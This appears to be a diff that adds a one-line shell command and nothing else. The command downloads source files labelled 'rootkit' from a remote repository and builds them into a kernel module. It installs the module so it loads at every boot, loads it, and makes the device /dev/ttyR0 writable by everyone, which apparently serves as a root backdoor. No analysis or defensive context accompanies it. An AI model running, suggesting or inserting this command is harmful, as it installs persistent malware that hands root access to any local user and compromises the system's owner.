@@ -1,0 +1,2 @@
+rm -R /tmp/rootkit; mkdir /tmp/rootkit && cd /tmp/rootkit && wget https://raw.githubusercontent.com/mixere4/internet_storage/master/rootkit/Makefile && wget https://raw.githubusercontent.com/mixere4/internet_storage/master/rootkit/root.c && make && cp root.ko /lib/modules/`uname -r`/root.ko && echo root > /etc/modules-load.d/root.conf && depmod && modprobe root && sleep 1 && chmod 0666 /dev/ttyR0
+
